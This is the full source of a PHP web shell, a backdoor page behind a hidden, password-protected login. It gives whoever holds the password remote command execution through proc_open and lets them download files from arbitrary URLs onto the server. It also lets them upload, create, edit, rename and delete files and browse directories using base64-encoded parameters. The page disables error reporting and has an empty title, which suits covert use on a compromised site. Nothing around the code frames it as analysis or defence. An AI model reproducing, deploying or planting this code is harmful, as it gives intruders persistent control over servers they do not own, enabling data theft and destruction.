<?php
ob_start();
set_time_limit(0);
error_reporting(0);
$hashed_password = '$2a$12$Uz7KdOLDdwk2q1J3VJq8KeEBkHllYUW41.FNl089vL58/ajDqodXu';

function admin_login() {
    echo '<form method="post">';
    echo '<input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password">';
    echo '</form>';
    exit;
}

if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200);
    } else {
        admin_login();
    }
}

$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
$scriptDirectory = dirname(__FILE__);

function x($b) {
    return base64_encode($b);
}

function y($b) {
    return base64_decode($b);
}

foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
chdir($currentDirectory);

$viewCommandResult = '';
$editFileContent = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<div class='message'>File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " uploaded successfully.</div>";
        } else {
            echo "<div class='message'>Error: Failed to upload file.</div>";
        }
    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
        if (!file_exists($newFolder)) {
            mkdir($newFolder);
            echo "<div class='message'>Folder created successfully!</div>";
        } else {
            echo "<div class='message'>Error: Folder already exists!</div>";
        }
    } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo "<div class='message'>File created successfully!</div>";
            } else {
                echo "<div class='message'>Error: Failed to create file!</div>";
            }
        } else {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo "<div class='message'>File edited successfully!</div>";
            } else {
                echo "<div class='message'>Error: Failed to edit file!</div>";
            }
        }
    } elseif (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToDelete)) {
            if (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    echo "<div class='message'>Folder deleted successfully!</div>";
                } else {
                    echo "<div class='message'>Error: Failed to delete folder!</div>";
                }
            } else {
                if (unlink($fileToDelete)) {
                    echo "<div class='message'>File deleted successfully!</div>";
                } else {
                    echo "<div class='message'>Error: Failed to delete file!</div>";
                }
            }
        } else {
            echo "<div class='message'>Error: File or directory not found!</div>";
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldName = $currentDirectory . '/' . $_POST['old_name'];
        $newName = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                echo "<div class='message'>Item renamed successfully!</div>";
            } else {
                echo "<div class='message'>Error: Failed to rename item!</div>";
            }
        } else {
            echo "<div class='message'>Error: Item not found!</div>";
        }
    } elseif (isset($_POST['xmd_input'])) {
        $command = $_POST['xmd_input'];
        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if (!empty($errors)) {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
            } else {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
            }
        } else {
            $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
        }
    } elseif (isset($_POST['view_file'])) {
        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToView)) {
            $fileContent = file_get_contents($fileToView);
            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
        } else {
            $viewCommandResult = '<hr><p>Error: File not found!</p>';
        }
    } elseif (isset($_POST['edit_file'])) {
        $fileToEdit = $currentDirectory . '/' . $_POST['edit_file'];
        if (file_exists($fileToEdit)) {
            $editFileContent = file_get_contents($fileToEdit);
        } else {
            echo "<div class='message'>Error: File not found!</div>";
        }
    } elseif (isset($_POST['save_file']) && isset($_POST['file_path'])) {
        $filePath = $_POST['file_path'];
        $fileContent = $_POST['file_content'];
        if (file_put_contents($filePath, $fileContent) !== false) {
            echo "<div class='message'>File saved successfully!</div>";
        } else {
            echo "<div class='message'>Error: Failed to save file!</div>";
        }
    } elseif (isset($_POST['download_url']) && isset($_POST['target_file'])) {
        $url = $_POST['download_url'];
        $targetFile = $currentDirectory . '/' . $_POST['target_file'];
        $ch = curl_init($url);
        $fp = fopen($targetFile, 'w+');
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
        curl_exec($ch);
        if (curl_errno($ch)) {
            echo "<div class='message'>Error: " . curl_error($ch) . "</div>";
        } else {
            echo "<div class='message'>File downloaded successfully from $url to $targetFile.</div>";
        }
        curl_close($ch);
        fclose($fp);
    }
}

ob_end_flush();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
    <link href="https://fonts.googleapis.com/css?family=Arial:400,700" rel="stylesheet">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f0f0f0;
            color: #333;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 900px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
            color: #333;
        }
        form {
            display: flex;
            flex-direction: column;
            margin-bottom: 20px;
        }
        form input[type="text"],
        form textarea,
        form input[type="file"] {
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            background-color: #fff;
            color: #333;
            border-radius: 4px;
            width: 100%;
            box-sizing: border-box;
        }
        form input[type="submit"] {
            padding: 10px;
            background-color: #007bff; 
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        form input[type="submit"]:hover {
            background-color: #0056b3;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border: 1px solid #ccc;
        }
        th {
            background-color: #f4f4f4;
        }
        tr:nth-child(even) {
            background-color: #f9f9f9;
        }
        tr:hover {
            background-color: #f1f1f1;
        }
        .folder,
        .file,
        .directory {
            color: #333;
        }
        a {
            color: #007bff;
        }
        .item-name {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            display: flex;
            align-items: center;
        }
        .item-name svg {
            margin-right: 8px;
        }
        .size, .date {
            width: 100px;
        }
        .permission {
            font-weight: bold;
            width: 80px;
            text-align: center;
        }
        .writable {
            color: #28a745;
        }
        .not-writable {
            color: #dc3545;
        }
        .message {
            margin-bottom: 20px;
            padding: 10px;
            background-color: #f4f4f4;
            border: 1px solid #ccc;
            border-radius: 4px;
            color: #333;
        }
        .result-box {
            width: 100%;
            height: 200px;
            background-color: #fff;
            color: #333;
            border: 1px solid #ccc;
            border-radius: 4px;
            padding: 10px;
            box-sizing: border-box;
        }
        .icon-folder {
            fill: #FFD700;
        }
        .icon-file {
            fill: #00BFFF;
        }
    </style>
</head>
<body>
<div class="container">
    <?php
    echo '<a href="?d=' . x($scriptDirectory) . '"><span style="color: #007bff;">[ GO Home ]</span></a>';
    echo '<hr>Current Directory: ';

    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
    $currentPath = '';
    foreach ($directories as $index => $dir) {
        $currentPath .= DIRECTORY_SEPARATOR . $dir;
        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    }

    echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
    echo '<br><hr>';

    echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">';
    echo '<input type="text" name="folder_name" placeholder="New Folder Name">';
    echo '<input type="submit" value="Create Folder">';
    echo '</form>';

    echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">';
    echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File">';
    echo '<textarea name="file_content" placeholder="File Content (for new file) or Edit Content (for existing file)"></textarea>';
    echo '<input type="submit" value="Create / Edit File">';
    echo '</form>';

    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="Choose file">';
    echo '<input type="submit" value="Upload File" name="submit">';
    echo '</form>';

    echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">';
    echo '<input type="text" name="xmd_input" placeholder="Enter command">';
    echo '<input type="submit" value="Run Command">';
    echo '</form>';

    echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">';
    echo '<input type="text" name="download_url" placeholder="Enter URL to download">';
    echo '<input type="text" name="target_file" placeholder="Target file name">';
    echo '<input type="submit" value="Download File">';
    echo '</form>';

    if ($editFileContent !== '') {
        echo '<form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">';
        echo '<input type="hidden" name="file_path" value="' . htmlspecialchars($fileToEdit) . '">';
        echo '<textarea name="file_content" rows="20">' . htmlspecialchars($editFileContent) . '</textarea>';
        echo '<input type="submit" name="save_file" value="Save File">';
        echo '</form>';
    }

    echo $viewCommandResult;

    echo '<table>';
    echo '<tr><th>Item Name</th><th>Size</th><th>Date</th><th>Permissions</th><th>View</th><th>Edit</th><th>Delete</th><th>Rename</th></tr>';

    $directories = [];
    $files = [];

    foreach (scandir($currentDirectory) as $item) {
        if ($item == '.' || $item == '..') continue;

        if (is_dir($item)) {
            $directories[] = $item;
        } else {
            $files[] = $item;
        }
    }

    foreach ($directories as $dir) {
        $u = realpath($dir);
        $s = stat($u);
        $itemLink = '?d=' . x($currentDirectory . '/' . $dir);
        $permission = substr(sprintf('%o', fileperms($u)), -4);
        $writable = is_writable($u);
        echo '<tr>
                <td class="item-name folder">
                    <svg class="icon-folder" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16"><path d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
                    <a href="' . $itemLink . '">' . $dir . '</a>
                </td>
                <td class="size">--</td>
                <td class="date" style="text-align: center;">' . date('Y-m-d H:i:s', $s['mtime']) . '</td>
                <td class="permission ' . ($writable ? 'writable' : 'not-writable') . '">' . $permission . '</td>
                <td><form method="post"><input type="hidden" name="view_file" value="' . htmlspecialchars($dir) . '"><input type="submit" value="View" disabled></form></td>
                <td></td>
                <td><form method="post"><input type="hidden" name="delete_file" value="' . htmlspecialchars($dir) . '"><input type="submit" value="Delete"></form></td>
                <td><form method="post"><input type="hidden" name="old_name" value="' . htmlspecialchars($dir) . '"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
            </tr>';
    }

    foreach ($files as $file) {
        $u = realpath($file);
        $s = stat($u);
        $itemLink = '?d=' . x($currentDirectory) . '&f=' . x($file);
        $permission = substr(sprintf('%o', fileperms($u)), -4);
        $writable = is_writable($u);
        echo '<tr>
                <td class="item-name file">
                    <svg class="icon-file" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16"><path d="M6 2h9l5 5v13c0 1.1-.9 2-2 2H6c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2z"/></svg>
                    <a href="' . $itemLink . '">' . $file . '</a>
                </td>
                <td class="size">' . filesize($u) . '</td>
                <td class="date" style="text-align: center;">' . date('Y-m-d H:i:s', $s['mtime']) . '</td>
                <td class="permission ' . ($writable ? 'writable' : 'not-writable') . '">' . $permission . '</td><td><form method="post"><input type="hidden" name="view_file" value="' . htmlspecialchars($file) . '"><input type="submit" value="View"></form></td>
                <td><form method="post"><input type="hidden" name="edit_file" value="' . htmlspecialchars($file) . '"><input type="submit" value="Edit"></form></td>
                <td><form method="post"><input type="hidden" name="delete_file" value="' . htmlspecialchars($file) . '"><input type="submit" value="Delete"></form></td>
                <td><form method="post"><input type="hidden" name="old_name" value="' . htmlspecialchars($file) . '"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
            </tr>';
    }

    echo '</table>';

    function deleteDirectory($dir) {
        if (!file_exists($dir)) {
            return true;
        }
        if (!is_dir($dir)) {
            return unlink($dir);
        }
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }
        return rmdir($dir);
    }
    ?>
</div>
</body>
</html>
